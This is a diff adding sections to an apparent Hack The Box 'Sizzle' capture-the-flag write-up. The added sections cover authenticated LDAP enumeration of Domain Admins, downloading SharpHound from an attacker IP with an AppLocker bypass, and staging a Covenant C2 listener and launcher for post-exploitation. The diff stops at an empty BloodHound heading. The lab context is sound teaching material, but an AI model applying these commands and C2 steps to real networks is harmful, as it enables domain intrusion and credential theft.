@@ -281,6 +281,22 @@ SYSVOL                         READ ONLY
 
 Now we additionally have read access on _CertEnroll_, _NETLOGON_ and _SYSVOL_.
 
+## Checking LDAP with authentication
+
+Lets get some information from LDAP with the user authentication:
+```markdown
+ldapsearch -x -h sizzle.htb.local -D 'amanda@HTB.local' -w 'Ashare1972' -b 'DC=HTB,DC=LOCAL'
+```
+
+Now it is dumping a lot of information from the base and with a LDAP query we can look for users in the _Domain Admins_ group:
+```markdown
+ldapsearch -x -h sizzle.htb.local -D 'amanda@HTB.local' -w 'Ashare1972' -b 'DC=HTB,DC=LOCAL' "(&(ObjectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"
+```
+
+There are two users in this group:
+- CN=Administrator,CN=Users,DC=HTB,DC=LOCAL
+- CN=sizzler,CN=Users,DC=HTB,DC=LOCAL
+
 ## Checking the Certificate Authority on HTTP
 
 The default path for Certificate Authorities on webservers is **/certsrv** which gives us an 401 (Not Authorized) status code normally.
@@ -338,4 +354,63 @@ ruby psremote.rb
 ```
 
 Running the script gives us a shell on the box as user _htb\amanda_!
+
+## Information Gathering on the domain
+
+Since we know that this is a domain controller and we have a session now, we should run **Bloodhound** to gather information about the domain. First we need to upload the ingestor **SharpHound.exe** onto the box and then we can execute it:
+
+```markdown
+IWR -Uri http://10.10.14.6/SharpHound.exe -OutFile SharpHound.exe
+```
+
+When trying to run it we see that a policy is blocking it so we need to [bypass AppLocker](https://github.com/api0cradle/UltimateAppLockerByPassList) by executing it in a directory that is whitelisted by default like _C:\Windows\Temp_ for example.
+
+```markdown
+.\SharpHound.exe
+```
+
+This creates a ZIP file that we need on our machine to analyze it with Bloodhound but it has not all the information we need, so we do that with a C2 Framework.
+
+### Starting a C2 Framework
+
+As we will need to communicate a lot with the box we will load up the C2 Framework **Covenant**.
+
+Installing it with Docker:
+```markdown
+docker build -t covenant .
+
+docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $(pwd)/Data:/app/Data covenant --username tester
+```
+
+After that we get a web server on localhost on port 7443 thats our C2 framework.
+
+![Covenant Dashboard](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-dashboard.png)
+
+Starting a Listener:
+
+![Covenant create Listener](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-listener.png)
+
+Hosting a Binary Launcher:
+
+![Covenant start Launcher](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-launcher.png)
+
+After executing that launcher.exe we get a call back and this can be seen on Grunts:
+
+![Covenant start Grunt](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt.png)
+
+Clicking on the Grunt name and then Interact:
+
+![Covenant interacting with Grunt](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt-2.png)
+
+With the command _help_ we can see every module we can execute like **Seatbelt, Rubeus, Mimikatz, Kerberoast** and much more.
+
+But we want to start the SharpHound.exe:
+
+![Covenant executing SharpHound](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt-3.png)
+
+And now we can download this file and analyze it with BloodHound.
+
+### Analyzing BloodHound
+
+
 
